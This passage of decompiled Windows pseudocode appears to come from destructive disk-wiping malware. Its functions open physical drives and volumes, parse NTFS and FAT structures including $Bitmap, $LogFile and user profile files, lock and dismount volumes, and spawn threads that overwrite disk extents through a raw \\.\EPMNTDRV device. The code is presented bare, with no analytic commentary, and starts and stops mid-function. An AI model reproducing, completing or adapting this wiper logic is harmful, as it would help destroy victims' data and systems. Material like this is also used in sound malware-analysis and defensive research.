        while ( v19 );
      }
      CryptReleaseContext(phProv, 0);
    }
    goto LABEL_25;
  }
  v15 = *(_DWORD **)a1;
  if ( *(_DWORD *)a1 )
  {
    if ( v8 == v15 )
    {
      if ( *v8 == v15 )
      {
        v16 = GetProcessHeap();
        HeapFree(v16, 0, v8);
        *(_DWORD *)a1 = 0;
        return 0;
      }
      *(_DWORD *)a1 = *v15;
    }
    *v8[1] = *v8;
    (*v8)[1] = v8[1];
    v18 = GetProcessHeap();
    HeapFree(v18, 0, v8);
  }
  return 0;
}

//----- (00401870) --------------------------------------------------------
int __fastcall sub_401870(LPCWSTR lpFileName, int a2, int a3)
{
  HANDLE FileW; // eax
  void *v5; // esi
  BOOL (__stdcall *v6)(HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPOVERLAPPED); // eax
  int v8; // eax
  _OWORD v9[2]; // [esp+10h] [ebp-3Ch] BYREF
  __int64 v10; // [esp+30h] [ebp-1Ch]
  __int64 OutBuffer; // [esp+38h] [ebp-14h] BYREF
  int v12; // [esp+40h] [ebp-Ch]
  DWORD BytesReturned[2]; // [esp+44h] [ebp-8h] BYREF

  if ( !lpFileName )
    return -1;
  v12 = 0;
  OutBuffer = 0LL;
  FileW = CreateFileW(lpFileName, 0xC0100180, 3u, 0, 3u, 0x80000000, 0);
  v5 = FileW;
  if ( !FileW || FileW == (HANDLE)-1 )
  {
    GetLastError();
    return (int)v5;
  }
  else
  {
    v6 = DeviceIoControl;
    if ( a3 )
    {
      if ( !DeviceIoControl(v5, 0x2D1080u, 0, 0, &OutBuffer, 0xCu, BytesReturned, 0) )
      {
        GetLastError();
LABEL_7:
        CloseHandle(v5);
        return 0;
      }
      if ( (_DWORD)OutBuffer != 7 )
        goto LABEL_7;
      v8 = v12;
      *(_QWORD *)a3 = OutBuffer;
      *(_DWORD *)(a3 + 8) = v8;
      v6 = DeviceIoControl;
    }
    if ( a2 )
    {
      if ( !v6(v5, 0x700A0u, 0, 0, v9, 0x28u, BytesReturned, 0) || DWORD2(v9[0]) != 11 && DWORD2(v9[0]) != 12 )
        goto LABEL_7;
      *(_OWORD *)a2 = v9[0];
      *(_OWORD *)(a2 + 16) = v9[1];
      *(_QWORD *)(a2 + 32) = v10;
    }
    return (int)v5;
  }
}

//----- (00401990) --------------------------------------------------------
int __fastcall sub_401990(void *a1, int a2, __int64 a3, DWORD *a4)
{
  DWORD *v4; // ebx
  int v6; // edi
  unsigned __int8 v7; // dl
  DWORD v8; // eax
  DWORD v9; // esi
  _DWORD *v10; // ecx
  LPVOID v11; // esi
  DWORD v12; // edx
  char v13; // al
  DWORD v14; // eax
  HANDLE ProcessHeap; // eax
  void *v16; // eax
  unsigned __int64 v17; // rax
  _WORD *v18; // edi
  HANDLE v19; // eax
  unsigned __int16 v21; // si
  char *v22; // ecx
  unsigned int v23; // edx
  unsigned int v24; // eax
  unsigned int v25; // ebx
  int v26; // edx
  unsigned int v27; // eax
  unsigned int v28; // edi
  unsigned __int64 v29; // [esp-10h] [ebp-2Ch]
  __int64 v30; // [esp-8h] [ebp-24h]
  SIZE_T v31; // [esp-4h] [ebp-20h]
  void *v32; // [esp-4h] [ebp-20h]
  DWORD NumberOfBytesRead; // [esp+Ch] [ebp-10h] BYREF
  DWORD nNumberOfBytesToRead; // [esp+10h] [ebp-Ch]
  HANDLE hFile; // [esp+14h] [ebp-8h]
  LPVOID lpBuffer; // [esp+18h] [ebp-4h]
  unsigned int i; // [esp+28h] [ebp+Ch]

  v4 = a4;
  hFile = a1;
  v6 = 0;
  lpBuffer = (LPVOID)a2;
  if ( a4 && a2 )
  {
    memset(a4, 0, 0x60u);
    v7 = *(_BYTE *)(a2 + 13);
    v8 = *(unsigned __int16 *)(a2 + 11);
    v9 = *(_DWORD *)(a2 + 40);
    a4[10] = v8;
    nNumberOfBytesToRead = v8 * v7;
    a4[11] = nNumberOfBytesToRead;
    v10 = lpBuffer;
    a4[2] = v9;
    HIDWORD(v29) = v10[11];
    LODWORD(v29) = v9;
    a4[3] = HIDWORD(v29);
    v11 = lpBuffer;
    a4[4] = sub_4010F0(v29, v7);
    a4[5] = v12;
    a4[16] = *((_DWORD *)v11 + 12);
    a4[17] = *((_DWORD *)v11 + 13);
    a4[18] = *((_DWORD *)v11 + 14);
    a4[19] = *((_DWORD *)v11 + 15);
    *a4 = *((_DWORD *)v11 + 18);
    a4[1] = *((_DWORD *)v11 + 19);
    v13 = *((_BYTE *)v11 + 64);
    v14 = v13 <= 0 ? 1 << -v13 : nNumberOfBytesToRead * (unsigned __int8)v13;
    a4[12] = v14;
    if ( hFile )
    {
      if ( hFile != (HANDLE)-1 )
      {
        v31 = a4[11];
        ProcessHeap = GetProcessHeap();
        v16 = HeapAlloc(ProcessHeap, 0, v31);
        HIDWORD(v30) = *((_DWORD *)v11 + 13);
        lpBuffer = v16;
        LODWORD(v30) = *((_DWORD *)v11 + 12);
        nNumberOfBytesToRead = a4[11];
        v17 = sub_4010B0(nNumberOfBytesToRead, v30);
        if ( SetFilePointerEx(hFile, (LARGE_INTEGER)(a3 + v17), 0, 0) )
        {
          v18 = lpBuffer;
          if ( ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, &NumberOfBytesRead, 0) )
          {
            if ( *(_DWORD *)v18 == 1162627398 && (v18[11] & 1) != 0 )
            {
              v21 = v18[10];
              v22 = (char *)v18 + v21;
              if ( v22 )
              {
                v23 = *((_DWORD *)v18 + 6);
                for ( i = v23; ; v23 = i )
                {
                  v24 = v21 + 16;
                  if ( v24 > v23 )
                    break;
                  v25 = v4[12];
                  if ( v24 > v25 )
                    break;
                  v26 = *(_DWORD *)v22;
                  if ( *(_DWORD *)v22 == -1 )
                    break;
                  if ( !v26 )
                    break;
                  v27 = *((_DWORD *)v22 + 1);
                  if ( !v27 )
                    break;
                  v28 = v27 + v21;
                  if ( v28 > i || v28 > v25 )
                    break;
                  if ( v22[8] )
                  {
                    if ( v27 < 0x40 )
                      break;
                    if ( v26 == 128 )
                    {
                      v6 = 1;
                      a4[14] = *((_DWORD *)v22 + 12);
                      a4[15] = *((_DWORD *)v22 + 13);
                      goto LABEL_13;
                    }
                  }
                  else if ( v27 < 0x18 )
                  {
                    break;
                  }
                  v21 += v27;
                  v22 += v27;
                  if ( !v22 )
                    break;
                  v4 = a4;
                }
              }
            }
          }
          else
          {
            GetLastError();
          }
          v6 = 0;
        }
        else
        {
          GetLastError();
        }
LABEL_13:
        if ( lpBuffer )
        {
          v32 = lpBuffer;
          v19 = GetProcessHeap();
          HeapFree(v19, 0, v32);
        }
      }
    }
  }
  return v6;
}
// 4019FA: variable 'v12' is possibly undefined

//----- (00401B80) --------------------------------------------------------
PSTR __stdcall sub_401B80(void *a1, int a2, int a3, _DWORD *a4, __int64 a5)
{
  PSTR result; // eax
  SIZE_T v6; // ebx
  unsigned __int64 v7; // rax
  unsigned __int64 v8; // rax
  int v9; // eax
  int v10; // ecx
  int v11; // edx
  __int64 v12; // [esp-10h] [ebp-90h]
  int v13; // [esp-8h] [ebp-88h]
  int v14; // [esp-8h] [ebp-88h]
  PSTR v15; // [esp+10h] [ebp-70h]
  CHAR String1[4]; // [esp+14h] [ebp-6Ch] BYREF
  int v17; // [esp+18h] [ebp-68h]
  char v18; // [esp+1Ch] [ebp-64h]
  DWORD v19[14]; // [esp+20h] [ebp-60h] BYREF
  __int64 v20; // [esp+58h] [ebp-28h]

  v18 = 0;
  *(_DWORD *)String1 = *(_DWORD *)(a2 + 3);
  v17 = *(_DWORD *)(a2 + 7);
  if ( lstrcmpA(String1, "NTFS    ") )
  {
    *(_DWORD *)String1 = *(_DWORD *)(a2 + 54);
    v17 = *(_DWORD *)(a2 + 58);
    v18 = 0;
    if ( StrStrA(String1, "FAT")
      || (v9 = *(_DWORD *)(a2 + 82),
          v17 = *(_DWORD *)(a2 + 86),
          *(_DWORD *)String1 = v9,
          (result = StrStrA(String1, "FAT")) != 0) )
    {
      v11 = *(unsigned __int16 *)(a2 + 22);
      if ( !(_WORD)v11 )
        v11 = *(_DWORD *)(a2 + 36);
      v10 = *(unsigned __int16 *)(a2 + 11);
      sub_401590(
        a3,
        a4,
        a5 + v10 * *(unsigned __int16 *)(a2 + 14),
        v10
      * ((v10 + 32 * *(unsigned __int16 *)(a2 + 17) - 1) / v10 + v11 * (unsigned int)*(unsigned __int8 *)(a2 + 16)),
        v10,
        v10 * *(unsigned __int8 *)(a2 + 13));
      return (PSTR)1;
    }
  }
  else
  {
    result = (PSTR)sub_401990(a1, a2, a5, v19);
    v15 = result;
    if ( result )
    {
      v6 = *(unsigned __int16 *)(a2 + 11) * *(unsigned __int8 *)(a2 + 13);
      v13 = *(unsigned __int16 *)(a2 + 11);
      v12 = v20;
      v7 = sub_4010B0(*(_QWORD *)(a2 + 48), v6);
      sub_401590(a3, a4, a5 + v7, v12, v13, v6);
      v14 = *(unsigned __int16 *)(a2 + 11);
      v8 = sub_4010B0(*(_QWORD *)(a2 + 56), v6);
      sub_401590(a3, a4, a5 + v8, v6, v14, v6);
      return v15;
    }
  }
  return result;
}

//----- (00401D10) --------------------------------------------------------
int __stdcall sub_401D10(int a1, int a2, int a3, _DWORD *a4, unsigned __int64 a5)
{
  __int64 v6; // [esp-10h] [ebp-10h]

  if ( !a5 )
    return 0;
  v6 = *(unsigned __int16 *)(a2 + 11) * (unsigned int)*(unsigned __int8 *)(a2 + 13);
  sub_401590(a3, a4, a5, v6, *(unsigned __int16 *)(a2 + 11), v6);
  return 1;
}

//----- (00401D60) --------------------------------------------------------
int __fastcall sub_401D60(int a1, int a2, void (__stdcall *a3)(void *, char *, int, int, DWORD, LONG))
{
  LARGE_INTEGER *v3; // esi
  void *v4; // edi
  int v5; // eax
  void *v6; // ebx
  SIZE_T v7; // edi
  HANDLE ProcessHeap; // eax
  HANDLE v9; // eax
  HANDLE v10; // eax
  unsigned int LowPart; // eax
  bool v12; // zf
  SIZE_T v13; // edx
  LARGE_INTEGER *v14; // eax
  HANDLE v15; // eax
  char *v16; // edi
  HANDLE v17; // eax
  void (__stdcall *v18)(HANDLE, DWORD, LPVOID); // esi
  HANDLE v20; // eax
  SIZE_T v21; // [esp-4h] [ebp-270h]
  LARGE_INTEGER *v22; // [esp-4h] [ebp-270h]
  WCHAR pszDest[262]; // [esp+10h] [ebp-25Ch] BYREF
  int v24[3]; // [esp+21Ch] [ebp-50h] BYREF
  __int128 v25; // [esp+228h] [ebp-44h] BYREF
  SIZE_T dwBytes[4]; // [esp+238h] [ebp-34h]
  __int64 v27; // [esp+248h] [ebp-24h]
  int v28; // [esp+250h] [ebp-1Ch]
  void *v29; // [esp+254h] [ebp-18h]
  unsigned int v30; // [esp+258h] [ebp-14h]
  int v31; // [esp+25Ch] [ebp-10h]
  DWORD BytesReturned; // [esp+260h] [ebp-Ch] BYREF
  LARGE_INTEGER *v33; // [esp+264h] [ebp-8h]

  v28 = a2;
  v31 = 0;
  v3 = 0;
  v27 = 0LL;
  v4 = 0;
  BytesReturned = 0;
  v25 = 0LL;
  v29 = 0;
  *(_OWORD *)dwBytes = 0LL;
  wnsprintfW(pszDest, 260, L"\\\\.\\PhysicalDrive%u", a1);
  v5 = sub_401870(pszDest, (int)&v25, (int)v24);
  v6 = (void *)v5;
  if ( v5 != -1 )
  {
    if ( !v5 )
      return 0;
    v7 = 9408;
    ProcessHeap = GetProcessHeap();
    v3 = (LARGE_INTEGER *)HeapAlloc(ProcessHeap, 8u, 0x24C0u);
    DeviceIoControl(v6, 0x70050u, 0, 0, v3, 0x24C0u, &BytesReturned, 0);
    if ( GetLastError() == 122 )
    {
      while ( 1 )
      {
        v9 = GetProcessHeap();
        HeapFree(v9, 0, v3);
        v7 += 144;
        v3 = 0;
        if ( v7 >= 0x48C0 )
          break;
        v10 = GetProcessHeap();
        v3 = (LARGE_INTEGER *)HeapAlloc(v10, 8u, v7);
        if ( !v3 )
        {
          GetLastError();
          break;
        }
        DeviceIoControl(v6, 0x70050u, 0, 0, v3, v7, &BytesReturned, 0);
        if ( GetLastError() != 122 )
          goto LABEL_7;
      }
    }
    else
    {
LABEL_7:
      if ( v3 )
      {
        LowPart = v3->LowPart;
        v31 = 1;
        if ( LowPart <= 2 )
        {
          v12 = v3->HighPart == 0;
          v30 = 0;
          if ( !v12 )
          {
            v13 = dwBytes[1];
            v14 = v3 + 6;
            v33 = v3 + 6;
            while ( v14->LowPart <= 1 )
            {
              v21 = v13;
              v15 = GetProcessHeap();
              v16 = (char *)HeapAlloc(v15, 0, v21);
              v29 = v16;
              if ( !v16 || !SetFilePointerEx(v6, v33[1], 0, 0) || !ReadFile(v6, v16, dwBytes[1], &BytesReturned, 0) )
              {
                GetLastError();
                break;
              }
              v13 = dwBytes[1];
              if ( dwBytes[1] >= 0x200 )
              {
                if ( !*(_WORD *)(v16 + 11) )
                  *(_WORD *)(v16 + 11) = dwBytes[1];
                a3(v6, v16, v28, v24[1], v33[1].LowPart, v33[1].HighPart);
                v13 = dwBytes[1];
              }
              v14 = v33 + 18;
              ++v30;
              v33 += 18;
              if ( v30 >= v3->HighPart )
              {
                v4 = v29;
                goto LABEL_23;
              }
            }
          }
        }
        v4 = v29;
        goto LABEL_23;
      }
    }
    v4 = 0;
  }
LABEL_23:
  if ( v6 && v6 != (void *)-1 )
    CloseHandle(v6);
  if ( v3 )
  {
    v22 = v3;
    v17 = GetProcessHeap();
    v18 = (void (__stdcall *)(HANDLE, DWORD, LPVOID))HeapFree;
    HeapFree(v17, 0, v22);
  }
  else
  {
    v18 = (void (__stdcall *)(HANDLE, DWORD, LPVOID))HeapFree;
  }
  if ( v4 )
  {
    v20 = GetProcessHeap();
    v18(v20, 0, v4);
  }
  return v31;
}
// 401F2D: conditional instruction was optimized away because %dwBytes@4.4>=200u

//----- (00401FE0) --------------------------------------------------------
DWORD __stdcall sub_401FE0(LPCWSTR lpRootPathName, int a2)
{
  HANDLE FileW; // eax
  void *v3; // ebx
  HANDLE ProcessHeap; // eax
  _DWORD *v5; // esi
  _DWORD *v6; // esi
  int v7; // edi
  int v8; // eax
  bool v9; // cf
  unsigned int v10; // edi
  bool v11; // of
  int v12; // eax
  unsigned __int64 v13; // rcx
  unsigned int v14; // eax
  unsigned int v15; // ebx
  unsigned int v16; // esi
  unsigned __int64 v17; // kr18_8
  DWORD v18; // ebx
  DWORD v19; // edi
  unsigned __int64 v20; // rax
  unsigned __int64 v21; // rax
  unsigned int v22; // eax
  int v23; // edi
  bool v24; // cc
  HANDLE v25; // eax
  unsigned __int64 v27; // [esp-10h] [ebp-258h]
  DWORD v28; // [esp-8h] [ebp-250h]
  SIZE_T v29; // [esp-4h] [ebp-24Ch]
  unsigned int v30; // [esp+10h] [ebp-238h]
  unsigned int v31; // [esp+14h] [ebp-234h]
  int v32; // [esp+18h] [ebp-230h] BYREF
  LPVOID lpMem; // [esp+1Ch] [ebp-22Ch] BYREF
  __int64 v34; // [esp+20h] [ebp-228h]
  DWORD BytesPerSector; // [esp+28h] [ebp-220h] BYREF
  DWORD SectorsPerCluster; // [esp+2Ch] [ebp-21Ch] BYREF
  DWORD BytesReturned; // [esp+30h] [ebp-218h] BYREF
  _DWORD *v38; // [esp+34h] [ebp-214h]
  _DWORD *v39; // [esp+38h] [ebp-210h]
  HANDLE v40; // [esp+3Ch] [ebp-20Ch]
  WCHAR FileName[260]; // [esp+40h] [ebp-208h] BYREF

  memset(FileName, 0, sizeof(FileName));
  SectorsPerCluster = 8;
  BytesPerSector = 512;
  if ( !GetDiskFreeSpaceW(lpRootPathName, &SectorsPerCluster, &BytesPerSector, 0, 0) )
    return GetLastError();
  wsprintfW(FileName, L"%s%.2s", L"\\\\.\\", lpRootPathName);
  FileW = CreateFileW(FileName, 0x80100000, 3u, 0, 3u, 0, 0);
  v3 = FileW;
  v40 = FileW;
  if ( !FileW || FileW == (HANDLE)-1 )
    return GetLastError();
  BytesReturned = 0;
  ProcessHeap = GetProcessHeap();
  v5 = HeapAlloc(ProcessHeap, 8u, 0x80u);
  v38 = v5;
  if ( DeviceIoControl(v3, 0x560000u, 0, 0, v5, 0x80u, &BytesReturned, 0) )
  {
    v39 = (_DWORD *)v5[2];
    lpMem = 0;
    v32 = 0;
    sub_401490(v3, (unsigned __int64 **)&lpMem, (DWORD *)&v32);
    v6 = lpMem;
    if ( lpMem )
    {
      v7 = *((_DWORD *)lpMem + 2);
      v8 = *((_DWORD *)lpMem + 3);
      v9 = v7 == 0;
      v10 = v7 - 1;
      v34 = 0LL;
      v11 = __OFSUB__(v8, v9);
      v12 = v8 - v9;
      v32 = v12;
      if ( v12 >= 0 && (!((v12 < 0) ^ v11 | (v12 == 0)) || v10) )
      {
        HIDWORD(v13) = HIDWORD(v34);
        v30 = HIDWORD(v34);
        v14 = v34;
        v31 = v34;
        do
        {
          LODWORD(v13) = v14;
          if ( ((1 << (v14 & 0x1F)) & v6[(unsigned int)(v13 >> 5) + 4]) != 0 )
          {
            v15 = (__PAIR64__(HIDWORD(v13), v31) + 1) >> 32;
            v16 = v31 + 1;
            LODWORD(v34) = v15;
            if ( __SPAIR64__(v15, v31 + 1) < __SPAIR64__(v32, v10) )
            {
              do
              {
                if ( ((1 << (v16 & 0x1F)) & *((_DWORD *)lpMem + (__PAIR64__(v15, v16) >> 5) + 4)) == 0 )
                  break;
                v17 = __PAIR64__(v15, v16) + 1;
                v15 = (__PAIR64__(v15, v16) + 1) >> 32;
                v16 = v17;
              }
              while ( __SPAIR64__(v15, v17) < __SPAIR64__(v32, v10) );
              LODWORD(v34) = v15;
            }
            v18 = BytesPerSector;
            v19 = SectorsPerCluster;
            v29 = SectorsPerCluster * BytesPerSector;
            v28 = BytesPerSector;
            v20 = sub_4010B0(__PAIR64__(v34, v16) - __PAIR64__(v30, v31), BytesPerSector);
            v27 = sub_4010B0(v20, v19);
            v21 = sub_4010B0(v19 * (unsigned __int64)v18, __SPAIR64__(v30, v31));
            sub_401590(a2, v39, *((_QWORD *)v38 + 2) + v21, v27, v28, v29);
            HIDWORD(v13) = v34;
            v22 = v16;
            v6 = lpMem;
          }
          else
          {
            v22 = v31;
          }
          v23 = v6[2];
          v31 = v22 + 1;
          HIDWORD(v13) = (__PAIR64__(HIDWORD(v13), v22) + 1) >> 32;
          v14 = v22 + 1;
          v9 = v23 == 0;
          v10 = v23 - 1;
          v30 = HIDWORD(v13);
          v24 = SHIDWORD(v13) < v6[3] - v9;
          v32 = v6[3] - v9;
        }
        while ( v24 );
        v3 = v40;
      }
      v25 = GetProcessHeap();
      HeapFree(v25, 0, v6);
    }
  }
  CloseHandle(v3);
  return 0;
}
// 4051F0: using guessed type wchar_t asc_4051F0[5];

//----- (00402290) --------------------------------------------------------
int __stdcall sub_402290(char *lpString, int a2)
{
  char *v2; // ecx
  __int16 v3; // ax
  unsigned int i; // edi
  __int16 *v5; // esi
  char *v6; // ecx
  __int16 v7; // ax
  WCHAR psz1[260]; // [esp+Ch] [ebp-210h] BYREF
  _DWORD v10[2]; // [esp+214h] [ebp-8h]

  v10[0] = L"$Bitmap";
  v10[1] = L"$LogFile";
  memset(psz1, 0, sizeof(psz1));
  v2 = lpString;
  do
  {
    v3 = *(_WORD *)v2;
    v2 += 2;
    *(_WORD *)&v2[(char *)psz1 - lpString - 2] = v3;
  }
  while ( v3 );
  for ( i = 0; i < 2; ++i )
  {
    v5 = (__int16 *)v10[i];
    v6 = (char *)psz1 + 2 * lstrlenW((LPCWSTR)lpString) - (_DWORD)v5;
    do
    {
      v7 = *v5++;
      *(__int16 *)((char *)v5 + (_DWORD)v6 - 2) = v7;
    }
    while ( v7 );
    sub_4023C0(psz1, a2);
  }
  return 0;
}
// 40520C: using guessed type wchar_t aBitmap[8];
// 40521C: using guessed type wchar_t aLogfile[9];

//----- (00402330) --------------------------------------------------------
int __stdcall sub_402330(int a1, int a2)
{
  HANDLE FileW; // edi
  WCHAR FileName[260]; // [esp+4h] [ebp-20Ch] BYREF
  DWORD BytesReturned; // [esp+20Ch] [ebp-4h] BYREF

  BytesReturned = 0;
  wsprintfW(FileName, L"%s%.2s", L"\\\\.\\", a1);
  FileW = CreateFileW(FileName, 0x80100000, 3u, 0, 3u, 0, 0);
  DeviceIoControl(FileW, 0x90018u, 0, 0, 0, 0, &BytesReturned, 0);
  DeviceIoControl(FileW, 0x90020u, 0, 0, 0, 0, &BytesReturned, 0);
  return 0;
}
// 402330: using guessed type int __stdcall sub_402330(int a1, int a2);
// 4051F0: using guessed type wchar_t asc_4051F0[5];

//----- (004023C0) --------------------------------------------------------
int __fastcall sub_4023C0(PCWSTR psz1, int a2)
{
  const WCHAR *v2; // esi
  HANDLE FileW; // eax
  void *v4; // edi
  char *v5; // ecx
  WCHAR v6; // ax
  HANDLE v7; // eax
  int v8; // esi
  HANDLE ProcessHeap; // eax
  unsigned int *v10; // eax
  int v11; // eax
  int v12; // ecx
  DWORD LastError; // esi
  SIZE_T v14; // edi
  unsigned __int64 v15; // rax
  void (__stdcall *v16)(HANDLE); // eax
  int result; // eax
  unsigned __int64 v18; // [esp-10h] [ebp-2A0h]
  DWORD v19; // [esp-8h] [ebp-298h]
  DWORD BytesPerSector; // [esp+14h] [ebp-27Ch] BYREF
  unsigned int *v22; // [esp+18h] [ebp-278h]
  _DWORD *v23; // [esp+1Ch] [ebp-274h] BYREF
  int v24; // [esp+20h] [ebp-270h]
  int v25; // [esp+24h] [ebp-26Ch]
  int v26; // [esp+28h] [ebp-268h]
  int v27; // [esp+2Ch] [ebp-264h]
  __int64 v28; // [esp+30h] [ebp-260h]
  DWORD BytesReturned; // [esp+38h] [ebp-258h] BYREF
  DWORD SectorsPerCluster; // [esp+3Ch] [ebp-254h] BYREF
  unsigned int v31; // [esp+40h] [ebp-250h]
  HANDLE v32; // [esp+50h] [ebp-240h]
  int v33; // [esp+54h] [ebp-23Ch]
  _DWORD InBuffer[2]; // [esp+58h] [ebp-238h] BYREF
  __int128 OutBuffer; // [esp+60h] [ebp-230h] BYREF
  __int128 v36; // [esp+70h] [ebp-220h]
  WCHAR FileName[260]; // [esp+88h] [ebp-208h] BYREF

  v27 = a2;
  v26 = 0;
  v2 = psz1;
  OutBuffer = 0LL;
  v36 = 0LL;
  FileW = CreateFileW(psz1, 0x80000000, 1u, 0, 3u, 0x80u, 0);
  v4 = FileW;
  v32 = FileW;
  if ( !FileW || FileW == (HANDLE)-1 )
  {
    GetLastError();
    if ( !v4 || v4 == (void *)-1 )
      return sub_404BE0(psz1, 0, v27);
  }
  if ( !StrCmpNW(v2, L"\\??\\", 4) || !StrCmpNW(v2, L"\\\\?\\", 4) )
    v2 += 4;
  v5 = (char *)((char *)&FileName[4] - (char *)v2);
  wcscpy(FileName, L"\\\\.\\");
  do
  {
    v6 = *v2++;
    *(const WCHAR *)((char *)v2 + (_DWORD)v5 - 2) = v6;
  }
  while ( v6 );
  FileName[6] = 0;
  if ( GetDiskFreeSpaceW(&FileName[4], &SectorsPerCluster, &BytesPerSector, 0, 0) )
  {
    v7 = CreateFileW(FileName, 0x12019Fu, 3u, 0, 3u, 0, 0);
    v8 = (int)v7;
    v33 = (int)v7;
    if ( v7 )
    {
      if ( v7 != (HANDLE)-1 )
      {
        ProcessHeap = GetProcessHeap();
        v10 = (unsigned int *)HeapAlloc(ProcessHeap, 8u, 0x80u);
        v22 = v10;
        if ( v10 )
        {
          if ( DeviceIoControl((HANDLE)v8, 0x560000u, 0, 0, v10, 0x80u, &BytesReturned, 0) )
          {
            v28 = 0LL;
            v11 = 0;
            v12 = 0;
            v24 = 0;
            v25 = 0;
            do
            {
              InBuffer[1] = v11;
              v23 = 0;
              InBuffer[0] = v12;
              DeviceIoControl(v4, 0x90073u, InBuffer, 8u, &OutBuffer, 0x20u, &BytesReturned, 0);
              LastError = GetLastError();
              LODWORD(v28) = DWORD1(v36);
              v31 = v36;
              if ( LastError )
              {
                if ( LastError != 234 )
                  break;
                v24 = DWORD1(v36);
                v25 = v36;
              }
              v14 = BytesPerSector * SectorsPerCluster;
              if ( sub_404110(v22, BytesPerSector * SectorsPerCluster, DWORD2(v36), SHIDWORD(v36), &v23) )
              {
                v19 = BytesPerSector;
                v18 = sub_4010B0(__PAIR64__(v28, v31) - *((_QWORD *)&OutBuffer + 1), v14);
                v15 = sub_4010B0(v14, *((__int64 *)&v36 + 1));
                sub_401590(v27, v23, *((_QWORD *)v22 + 2) + v15, v18, v19, v14);
                v26 = 1;
              }
              v4 = v32;
              v11 = v24;
              v12 = v25;
            }
            while ( LastError == 234 );
            v8 = v33;
          }
        }
      }
    }
  }
  else
  {
    v8 = -1;
  }
  v16 = (void (__stdcall *)(HANDLE))CloseHandle;
  if ( v4 != (void *)-1 )
  {
    CloseHandle(v4);
    v16 = (void (__stdcall *)(HANDLE))CloseHandle;
  }
  if ( v8 )
  {
    if ( v8 != -1 )
      v16((HANDLE)v8);
  }
  result = v26;
  if ( !v26 )
    return sub_404BE0(psz1, 0, v27);
  return result;
}
// 4051F0: using guessed type wchar_t asc_4051F0[5];

//----- (004026A0) --------------------------------------------------------
DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
{
  int *v2; // esi
  int v3; // eax
  void *v4; // ebx
  unsigned int v5; // edi
  unsigned int v6; // edx
  signed __int64 v7; // kr00_8
  LARGE_INTEGER v8; // kr08_8
  LARGE_INTEGER v9; // kr10_8
  DWORD LastError; // esi
  int v11; // [esp-4h] [ebp-254h]
  DWORD NumberOfBytesWritten; // [esp+10h] [ebp-240h] BYREF
  __int64 nNumberOfBytesToWrite; // [esp+14h] [ebp-23Ch]
  LPCVOID lpBuffer; // [esp+1Ch] [ebp-234h]
  _BYTE v15[40]; // [esp+20h] [ebp-230h] BYREF
  WCHAR pszDest[260]; // [esp+48h] [ebp-208h] BYREF

  if ( !lpThreadParameter )
    return 87;
  v2 = (int *)*((_DWORD *)lpThreadParameter + 2);
  if ( !v2 )
    return 87;
  v11 = *((_DWORD *)lpThreadParameter + 3);
  NumberOfBytesWritten = 0;
  wnsprintfW(pszDest, 260, L"\\\\.\\EPMNTDRV\\%u", v11);
  v3 = sub_401870(pszDest, (int)v15, 0);
  v4 = (void *)v3;
  if ( !v3 || v3 == -1 )
    goto LABEL_15;
  lpBuffer = (LPCVOID)*((_DWORD *)lpThreadParameter + 4);
  LODWORD(nNumberOfBytesToWrite) = *((_DWORD *)lpThreadParameter + 5);
  do
  {
    v5 = v2[2];
    v6 = v2[3];
    v7 = __PAIR64__(v6, v5) + *((_QWORD *)v2 + 2);
    HIDWORD(nNumberOfBytesToWrite) = v6;
    v8.QuadPart = __PAIR64__(v6, v5);
    if ( __SPAIR64__(v6, v5) < v7 )
    {
      do
      {
        NumberOfBytesWritten = 0;
        if ( !SetFilePointerEx(v4, v8, 0, 0) )
          GetLastError();
        if ( !WriteFile(v4, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0) )
          GetLastError();
        v8.QuadPart = nNumberOfBytesToWrite + v8.LowPart;
        v9.QuadPart = *((_QWORD *)v2 + 1) + *((_QWORD *)v2 + 2);
        HIDWORD(nNumberOfBytesToWrite) = v8.HighPart;
      }
      while ( v8.QuadPart < v9.QuadPart );
    }
    v2 = (int *)*v2;
  }
  while ( v2 != *((int **)lpThreadParameter + 2) );
  if ( FlushFileBuffers(v4) )
    LastError = 0;
  else
LABEL_15:
    LastError = GetLastError();
  if ( v4 )
  {
    if ( v4 != (void *)-1 )
      CloseHandle(v4);
  }
  return LastError;
}

//----- (004027F0) --------------------------------------------------------
BOOL __thiscall sub_4027F0(_DWORD **this)
{
  DWORD v2; // esi
  _DWORD *v3; // edi
  HANDLE Thread; // eax
  DWORD i; // edi
  HANDLE Handles[100]; // [esp+Ch] [ebp-190h] BYREF

  v2 = 0;
  v3 = *this;
  if ( *this )
  {
    do
    {
      Thread = CreateThread(0, 0, StartAddress, v3, 0, 0);
      Handles[v2] = Thread;
      if ( Thread )
        ++v2;
      v3 = (_DWORD *)*v3;
    }
    while ( v3 != *this );
    WaitForMultipleObjects(v2, Handles, 1, 0xFFFFFFFF);
    for ( i = 0; i < v2; ++i )
      CloseHandle(Handles[i]);
  }
  return v2 != 0;
}

//----- (00402870) --------------------------------------------------------
DWORD __stdcall sub_402870(_DWORD **lpThreadParameter)
{
  sub_4027F0(lpThreadParameter);
  return 0;
}

//----- (00402890) --------------------------------------------------------
int __stdcall sub_402890(PCWSTR psz1, _DWORD *a2, int a3)
{
  if ( (*a2 & 0x400) != 0 || a2[8] >= 0x400u || a2[7] )
    return sub_4023C0(psz1, a3);
  else
    return 0;
}

//----- (004028D0) --------------------------------------------------------
int __stdcall sub_4028D0(PCWSTR psz1, int a2, int a3)
{
  if ( StrStrIW((PCWSTR)(a2 + 44), L"ntuser")
    && ((*(_DWORD *)a2 & 0x400) != 0 || *(_DWORD *)(a2 + 32) >= 0x400u || *(_DWORD *)(a2 + 28)) )
  {
    sub_4023C0(psz1, a3);
  }
  return 0;
}

//----- (00402920) --------------------------------------------------------
int __stdcall sub_402920(PCWSTR pszFirst, _BYTE *a2, int a3)
{
  bool v3; // zf
  int v4; // esi
  PCWSTR pszSrch; // [esp+Ch] [ebp-4h]

  v3 = (*a2 & 0x10) == 0;
  pszSrch = L"AppData";
  if ( v3 )
    return 1;
  v4 = 0;
  while ( !StrStrIW(pszFirst, (&pszSrch)[v4]) )
  {
    if ( ++v4 )
      return 1;
  }
  return 0;
}
// 405264: using guessed type wchar_t aAppdata[8];

//----- (00402970) --------------------------------------------------------
int __stdcall sub_402970(PCWSTR pszFirst, _BYTE *a2, int a3)
{
  bool v3; // zf
  int v4; // esi
  PCWSTR pszSrch[2]; // [esp+Ch] [ebp-8h]

  v3 = (*a2 & 0x10) == 0;
